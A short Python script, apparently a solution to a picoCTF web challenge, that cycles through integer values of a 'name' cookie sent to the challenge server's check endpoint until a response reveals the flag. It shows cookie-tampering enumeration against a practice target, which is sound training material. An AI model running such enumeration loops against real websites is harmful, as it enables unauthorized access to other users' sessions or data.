#!/usr/bin/python3
import re

import requests

#* for cookies always better to use sessions
requests.session()
url = "http://mercury.picoctf.net:27177/"

i = 10
while True:
	r = requests.get(url + "check", cookies={"name": str(i)})

	#print(r.text)
	b_tag = r.text

	pat = re.compile(r"<b>(.+?)</b>")
	try:
		response = pat.findall(b_tag)[0]
		if "Flag" in response:
			print(re.findall("picoCTF{.*}", r.text)[0])
			break
	except:
		pass
	i+=1
	#print(f"{i}, {response}")
